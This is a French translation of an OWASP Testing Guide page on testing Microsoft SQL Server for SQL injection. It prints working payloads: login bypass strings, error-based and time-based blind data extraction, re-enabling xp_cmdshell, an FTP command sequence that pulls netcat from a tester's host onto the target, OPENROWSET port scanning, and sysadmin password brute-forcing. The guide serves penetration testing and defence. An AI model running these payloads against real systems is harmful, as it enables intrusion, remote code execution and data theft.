## Sommaire

Nous allons présenter dans cette section quelques techniques d'injection
SQL [SQL Injection](SQL_Injection "wikilink") utilisant des
fonctionnalités spécifiques à Microsoft SQL Server.

Les vulnérabilités d'injections SQL [SQL
Injection](SQL_Injection "wikilink") adviennent chaque fois qu'une
entrée est utilisée dans la construction d'une requête SQL sans avoir
été contrôlées et nettoyées. L'utilisation de code SQL dynamique
(construction de requêtes SQL par concaténation de chaînes) ouvre la
voie à ces vulnérabilités. Une injection SQL permet à un attaquant
d'accéder à des serveurs SQL. Cela permet l'exécution de code SQL avec
les privilèges de l'utilisateur utilisé pour se connecter à la base de
données.

Comme expliqué dans la section [SQL
injection](SQL_injection "wikilink"), une exploitation d'injection SQL
nécessite deux choses : un point d'entrée, et une exploitation à
entrer. Tout paramètre contrôlé par l'utilisateur et traité par
l'application peut dissimuler une vulnérabilité. Cela inclut :

  - Les paramètres applicatifs dans les chaînes des requêtes
    (c'est-à-dire les requêtes GET)
  - Les paramètres applicatifs inclus dans les requêtes POST
  - Les informations liées aux navigateur (c'est-à-dire les user-agent,
    referer)
  - Les informations liées aux hôtes (c'est-à-dire les noms d'hôtes,
    leurs adresses IP)
  - Les informations liées aux sessions (c'est-à-dire le dientifiants
    utilisateur, les cookies)

Microsoft SQL Server a quelques caractéristiques spécifiques, il faut
donc adapter les exploits à cette application.

## Comment tester

### Caractéristiques de SQL Server

Pour commencer, voyons quels les opérateurs et commande/procédures
stockées de SQL Server qui peuvent être utiles pour tester les
injections SQL :

  - Opérateur de commentaire : -- (utile pour forcer la requête à
    ignorer la partie suivante de la requête d'origine ; cela ne sera
    pas nécessaire dans tous les cas)
  - Séparateur de requête : ; (point-virgule)
  - Quelques procédures stockées utiles :
      - [xp_cmdshell](http://msdn2.microsoft.com/en-us/library/ms175046.aspx)
        exécute une commande shell quelconque, avec les permissions de
        SQL Server. Par défaut, uniquement l'utilisateur **sysadmin**
        est autorisé à utiliser cette procédure, et depuis SQL Server
        2005 cet utilisateur est désactivé par défaut (il peut être
        réactivé en utilisant sp_configure)
      - **xp_regread** lit une valeur arbitraire dans la Registry
        (procédure étendue non documentée)
      - **xp_regwrite** écrit une valeur dans la Registry (procédure
        étendue non documentée)
      - [sp_makewebtask](http://msdn2.microsoft.com/en-us/library/ms180099.aspx)
        lance une commande shell Windows et lui passe une chaîne à
        exécuter. Toutes les sorties seront retournées en ligne de
        texte. Necessite les privilèges **sysadmin**.
      - [xp_sendmail](http://msdn2.microsoft.com/en-US/library/ms189505.aspx)
        envoie un courriel aux destinataires donnés, qui peut inclure un
        résultat de requête en pièce-jointe. Cette procédure étendue
        utilise SQL Mail pour envoyer le message.


Voyons maintenant quelques exemples d'attaques spécifiques à SQL Server
utilisant les fonctions mentionnées ci-dessus. La plupart des ces
exemples vont utiliser la fonction **exec**.

Nous allons montrer plus bas une commande shell qui écrit la sortie de
la commande *dir c:\\inetpub* dans un fichier accessible par le web,
considérant que le serveur web et le serveur de base de données sont sur
la même machine. La syntaxe suivante utilise xp_cmdshell :

```
 exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--
```

On pourrait aussi utiliser sp_makewebtask:

```
 exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--
```

Une exécution réussie va créer un fichier qui peut être accédé par le
testeyr. Il faut garde à l'esprit que sp_makewebtask est obsolète, elle
pourrait être supprimée dans les versions ultérieures à SQL Server 2005.

De plus, SQL Server comporte des fonctions intégrées eet des variables
d'environnement qui peuvent être très utiles. La requête suivant utilise
la fonction **db_name()** pour déclencher une erreur qui va retourner
le nom de la base de données :

    /controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())

Remarquer l'utilisation de
[convert](http://msdn.microsoft.com/library/en-us/tsqlref/ts_ca-co_2f3o.asp):

    CONVERT ( data_type [ ( length ) ] , expression [ , style ] )

CONVERT va essayer de convertir le résultat de db_name (une chaîne) en
une variable entière, déclencher une erreur qui, si elle est affichée
par l'application vulnérable, va contenir le nom de la base.

L'exemple suivant utilise la variable d'environnement '''@@version ''',
en la combinant avec une injection de type "union select", afin de
découvrir la version de SQL Server.

    /form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--

Et la même attaque, en utilisant la technique de conversion :

```
 /controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)
```

La récolte d'information est utile pour exploiter les vulnérabilités
d'SQL Server, grâce à des attaques par injections SQL ou accès direct au
listener SQL.

Nous allons maintenant montrer des exemples qui exploitent des
vulnérabilités d'injections SQL via divers points d'entrées.

### Exemple 1: tester une injection SQL via une requête GET.

Le cas le plus simple (et souvent le plus avantageux) est celui d'une
page de connexion demandant un identifiant d'utilisateur et un mot de
passe. On peut y entrer la chaîne suivante "' or '1'='1" (sans les
guillemets) :

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

Si l'application utilise des requêtes SQL dynamiques, que la chaîne est
ajoutée à la requête de vérification des accès utilisateur, cela peut
résulter en une connexion réussie à l'application.

### Exemple 2: tester une injection SQL dans une requête GET

Pour connaître le nombre de colonnes existantes

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### Exemple 3: tester dans une requête POST

Injection SQL dans le contenu d'une requête POST :
email=%27\&whichSubmit=submit\&submit.x=0\&submit.y=0

Un exemple plus complet :

`POST https://vulnerable.web.app/forgotpass.asp HTTP/1.1`
`Host: vulnerable.web.app`
`User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 Paros/3.2.13`
`Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5`
`Accept-Language: en-us,en;q=0.5`
`Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7`
`Keep-Alive: 300`
`Proxy-Connection: keep-alive`
`Referer: http://vulnerable.web.app/forgotpass.asp`
`Content-Type: application/x-www-form-urlencoded`
`Content-Length: 50`
` email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

Le message d'erreur suivant est obtenu quand on entre un ' (simple
quote) dans le champ email :

`Microsoft OLE DB Provider for SQL Server error '80040e14'`
`Unclosed quotation mark before the character string '' '.`
`/forgotpass.asp, line 15 `

### Exemple 4: Un autre exemple GET utile

Récupérer le code source de l'application :

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### Exemple 5: xp_cmdshell personnalisé

Dans tous les ouvrages et articles traitant des bonnes pratiques de
sécurité pour SQL Server, il est recommandé de désactiver xp_cmdshell
dans SQL Server 2000 (dans SQL Server 2005 elle désactivée par défaut).
Cependant, si on a les droits sysadmin (nativement ou en burte-forçant
le mot de passe sysadmin, voir plus bas), on peut contourner cette
limitation.

Sous SQL Server 2000:

  - Si xp_cmdshell a été désactivée avec sp_dropextendedproc, on peut
    injecter simplement le code suivant :

<!-- end list -->

    sp_addextendedproc 'xp_cmdshell','xp_log70.dll'

  - Si le code précédent ne fonctionne pas, cela signifie que
    xp_log70.dll a été déplacé ou effacé. Dans ce cas on doit injecter
    le code suivant :

<!-- end list -->

    CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
      DECLARE @result int, @OLEResult int, @RunResult int
      DECLARE @ShellID int
      EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
      IF @OLEResult <> 0 SELECT @result = @OLEResult
      IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
      EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
      IF @OLEResult <> 0 SELECT @result = @OLEResult
      IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
      EXECUTE @OLEResult = sp_OADestroy @ShellID
      return @result

Ce code, écrit par Antonin Foller (voir les liens en bas de page), crée
une nouvelle fonction xp_cmdshell en utilisant sp_oacreate,
sp_oamethod et sp_oadestroy (à condition qu'elles n'aient pas aussi
été désactivées, bien sûr). Avant de l'utiliser il faut d'abord
effacer la première fonction xp_cmdshell que nous avons créée (même si
elle ne fonctionnait pas), sinon les deux déclarations vont entrer en
collision.

On SQL Server 2005, xp_cmdshell can be enabled by injecting the
following code instead:

    master..sp_configure 'show advanced options',1
    reconfigure
    master..sp_configure 'xp_cmdshell',1
    reconfigure

### Exemple 6: Referer / User-Agent

L'entête REFERER a cette valeur :

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`

Cela permet l'exécution de code SQL arbitraire. Cela arrive aussi si le
User-Agent a cette valeur :

`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`

### Exemple 7: utiliser SQL Server comme un scanner de ports

Sous SQL Server, OPENROWSET est une des commandes les plus utiles (pour
le testeur d'intrusion). Elle est utilisée pour exécuter une requête sur
un autre serveur de base de données et en récupérer les résultats. Le
tester peut utiliser cette commande pour scanner les ports des autres
machines du réseau ciblé, en injectant la requête suivante :

    select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--

La requête va tenter d'ouvrir une connexion vers l'adresse x.y.w.z sur
le port p. Si le port est fermé, le message suivant sera retourné :

    SQL Server does not exist or access denied

Si le port est ouvert, une des erreurs suivantes sera retournée :

    General network error. Check your network documentation

    OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.

Bien sûr, le message d'erreur n'est pas toujours disponible. Si c'est le
cas, on peut utiliser le temps de réponse pour comprendre ce qui se
passe : en cas de port fermé, le timeout (5 secondes dans cet exemple)
sera écoulé, alors qu'un port ouvert retournera un résultat
immédiatement.

Il faut garder à l'esprit que OPENROWSET est activée par défaut dans SQL
Server 200 mais désactivée dans SQL Server 2005.

### Exemple 8: télécharger des exécutables

Une fois que l'on peut utiliser xp_cmdshell (soit la version native
soit la version personnalisée), on peut facilement télécharger des
exécutables vers le serveur de base de données. Un choix très commun
ser netcat.exe, mais un trojan quelconque sera aussi utile ici. Si la
cible est autorisée pour démarrer une connexion FTP vers la machine du
testeur, il suffit d'injecter les requêtes suivantes :

    exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
    exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
    exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
    exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
    exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
    exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
    exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--

A ce moment, nc.exe sera téléchargé et disponible.
Si le firewall n'autorise pas FTP, il y a moyen de le contourner en
exploitant le debogueur Windows, debug.exe, qui est installé par défaut
sur toutes les machines Windows. Debug.exe est scriptable et peut créer
un exécutable en exécutant le fichier script approprié. Il faut donc
convertir l'exécutable en un script de déboguage (qui est un fichier
100% ASCII), de le télécharger ligne par ligne et d'appeler debug.exe
dessus. Divers outils permettent de créer de tels fichiers (par exemple
makescr.exe d'Ollie Whitehouse et dbgtool.exe de toolcrypt.org). Les
requêtes seront les suivantes :

    exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
    exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
    ....
    exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
    exec master..xp_cmdshell 'debug.exe < debugscript.txt';--

A ce moment, notre exécutable est disponible sur la machine cible, prêt
à être exécuté. Il y a des outils pour automatiser ce procédé,
notamment Bobcat, tournant sous Windows, et Sqlninja, tournant sous
Linux (voir les outils en bas de page).

### Obtenir des informations non affichées (out-of-band)

Tout n'est pas perdu lorsque l'application web ne retourne aucune
information, telle que des messages d'erreurs explicites (voir [Blind
SQL Injection](Blind_SQL_Injection "wikilink")). Par exemple, il peut
arriver que l'on ait accès au code source (par exemple si l'application
est basée sur un logiciel open source). Dans ce cas, le testeur peut
exploiter toutes les vulnérabilités d'injection SQL découvertes dans
l'application web. Bien qu'un IPS puisse stopper certaines de ces
attaques, la meilleure manière de procéder est la suivante : développer
et tester les attaques sur un banc d'essai créé à cet effet, puis
exécuter ces attaques contre l'application cible elle-même.

D'autres options pour les attaques out-of-band sont dérites dans
l'exemple 4 plus haut.

### Attaques d'injection SQL en aveugle

#### Essais et erreurs

De manière différente, on peut tenter de jouer la chance. Dans ce cas,
l'attaquant peut considérer qu'il y a une vulnérabilité d'injection SQL
out-of-band dans une application web. Il va ensuite choisir un vecteur
d'attaque (par exemple une entrée web), utiliser les vecteurs fuzz
([1](OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors "wikilink")) contre ce
canal et regarder les réponses. Par exemple, si l'application web
recherche des livres en utilisant la requête

`  select * from books where title=`**`texte``   ``entré``   ``par``
 ``l'utilisateur`**

alors le testeur peut entrer le texte : **'Bomba' OR 1=1-** et si les
données ne sont pas correctement validées, la requête va passer et
retourner la liste complète des livres. C'est la preuve qu'il y a une
vulnérabilité d'injection SQL. Le testeur peut ensuite *jouer* avec les
requêtes afin d'évaluer la gravité de cette vulnérabilité.

#### Si plus d'un message d'erreur sont affichés

D'autre part, si aucune information préalable n'est disponible, il y a
quand même moyen de monter une attaque en exploitant un *covert channel*
(canal couvert). Il peut arriver que les messages d'erreur soient
bloqués, mais que ces messages donnent tout de même quelques
informations. Par exemple :

  - Dans certains cas, l'application web (en fait le serveur web) va
    retourner le message traditionnel *500: Internal Server Error*, par
    exemple quand l'application renvoit une exception générée par des
    quotes non-fermées.
  - Dans d'autres cas le serveur renverra un message 200 OK, alors que
    l'application retournera un message d'erreur défini par les
    développeurs : *Internal server error* ou *bad data*.

Ces informations parcellaires peuvent suffire à comprendre comme la
requête SQL dynamique est construite, et comment adapter une
exploitation. Les résultats stockés dans des fichiers HTML accessibles
sont une autre méthode out-of-band.

#### Attaques temporelles

Il y a encore une autre manière de procéder à une attaque d'injection
SQL en aveugle quand on n'a pas de retour visible de l'application : en
mesurant le temps que met l'application web à repondre à une requête.
Anley (\[2\]) décrit un tel type d'attaque, le prochain exemple est tiré
de cet article. Une approche classique est d'utiliser la commande
*waitfor delay* : considérons que l'attaquant désire vérifier si la base
de données d'exemple 'oubs' existe, il va simplement injecter la
commande suivante :

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

En fonction du temps que va prendre la requête pour répondre, il aura sa
réponse. En fait il y a deux choses : une **vilnérabilité d'injection
SQL** et un **canal caché** qui permettent le testeur d'obtenir 1 bit
d'information pour chaque requête. Ainsi, en utilisant plusieurs
requêtes (autant que de bits d'information à récupérer), le testeur
peut obtenir n'importe quelle donnée dans la base. Considérons la
requête suivante :

`declare @s varchar(8000)`
`declare @i int`
`select @s = db_name()`
`select @i = [some value]`
`if (select len(@s)) < @i waitfor delay '0:0:5'`

En mesurant le temps de réponse pour chaque valeur de @i, on peut
déduire la lingueur du nom de la base de donnée courante, puis
commencer à extraire le nom lui-même avec la requête suivante :

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

Cette requête va attendre 5 secondes pour chaque '@bit' égal à 1 de
'@byte' du nom de la base de données courante, et répondra immédiatement
si '@bit' est égal à 0. En imbriquant deux cycles (un pour @byte et un
pout @bit) on sera capable d'extraire l'ensemble de l'information.

Cepandant, il arrive parfois que la commande *waitfor* ne soit pas
disponible (parce qu'un IPS ou un pare-feu applicatif la filtre, par
exemple). Cela ne signifie pas que les attaques par injection SQL en
aveugle soient impossible, puisque le testeur peut utiliser toute
opération prenant du temps qui ne sera pas filtrée. Par exemple :

`declare @i int select @i = 0`
`while @i < 0xaffff begin`
`select @i = @i + 1`
`end`

#### Vérifier la version et ses vulnérabilités

La même approche temporelle peut être utilisée pour comprendre à quelle
version de SQL Server on a à faire. On va bien sûr utiliser la variable
intégrée @@version. Considérons la requête suivante :

`select @@version`

Sous SQL Server 2005, on va obtenir un résultat ressemblant à :

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37 `<snip>

La partie '2005' de la chaîne est placée du 22e au 25e caractère. Ainsi,
la requête à injecter est la suivante :

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

Une telle requête va attendre 5 secondes si le 25e caractère de la
variable @@version est '5', dévoilant que l'on a à faire à SQL Server
2005. Si la requête répond immédiatement, on a surement à faire à SQL
Server 2000, et une autre requête similaire permettra de le confirmer.

### Exemple 9: brute-forcer le mot de passe sysadmin

Pour brute-forcer le mot de passe du sysadmin, on peut utiliser le fait
que OPENROWSET nécessite l'accès adéquat pour se connecter et qu'une
telle connexion peut être effectuée avec le serveur de base local. En
combinant ce fait avec une injection inférentielle basée sur le temps de
réponse, on peut injecter le code suivant :

    select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')

Ici, on essaie d'ouvrir une connexion à la base locale (désignée par le
champ vide après 'SQLOLEDB'), en utilisant 'sa' comme identifiant et
'<pwd>' comme mot de passe. Si le mot de pasase est correct et que la
connexion est réussie, la requête est exécutée et fait attendre la base
pendant 5 secondes (et lui fait aussi renvoyer une valeur, puisque
OPENROWSET nécessite au moins une colonne). Récupérer les mot de passe à
tester depuis une liste de mots et mesurer le temps nécessaire à chaque
connexion va nous permettre de deviner le mot de passe correct. Dans
"Data-mining with SQL Injection and Inference", David Litchfield pousse
la technique encore plus loin, en injectant un morceau de code afin de
brute-forcer le mot de passe du sysadmin en utilisant les ressources CPU
du serveur de base lui-même.

Une fois le mot de passe du sysadmin connu, on a deux choix :

  - Injecter les requêtes suivantes en utilisant OPENROWSET, afin
    d'utiliser les privilèges du sysadmin

<!-- end list -->

  - Ajouter notre utilisateur courant dans le group sysadmin en
    utilisant sp_addsrvrolemember. Le nom de l'utilisateur courant peut
    être extrait en utilisant une injection inférentielle sur la
    variable system_user.

N'oublions pas que OPENROWSET est accessible à tout ulisateur sur SQL
Server 2000 mais est restreint aux comptes administrateur sur SQL Server
2005.

## Outils

  - Francois Larouche: Multiple DBMS SQL Injection tool - [SQL Power
    Injector](http://www.sqlpowerinjector.com/index.htm)
  - Northern Monkee:
    [Bobcat](http://www.northern-monkee.co.uk/projects/bobcat/bobcat.html)
  - icesurfer: SQL Server Takeover Tool -
    [sqlninja](http://sqlninja.sourceforge.net)
  - Bernardo Damele A. G.: sqlmap, automatic SQL injection tool -
    <http://sqlmap.org/>

## Références

**Whitepapers**
\* David Litchfield: "Data-mining with SQL Injection and Inference" -
<http://www.databasesecurity.com/webapps/sqlinference.pdf>

  - Chris Anley, "(more) Advanced SQL Injection" -
    <http://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf>
  - Steve Friedl's Unixwiz.net Tech Tips: "SQL Injection Attacks by
    Example" - <http://www.unixwiz.net/techtips/sql-injection.html>
  - Alexander Chigrik: "Useful undocumented extended stored procedures"
    - <http://www.mssqlcity.com/Articles/Undoc/UndocExtSP.htm>
  - Antonin Foller: "Custom xp_cmdshell, using shell object" -
    <http://www.motobit.com/tips/detpg_cmdshell>
  - Paul Litwin: "Stop SQL Injection Attacks Before They Stop You" -
    <http://msdn.microsoft.com/en-us/magazine/cc163917.aspx>
  - SQL Injection -
    <http://msdn2.microsoft.com/en-us/library/ms161953.aspx>
  - Cesar Cerrudo: Manipulating Microsoft SQL Server Using SQL Injection
    -
    <http://www.appsecinc.com/presentations/Manipulating_SQL_Server_Using_SQL_Injection.pdf>
    uploading files, getting into internal network, port scanning, DOS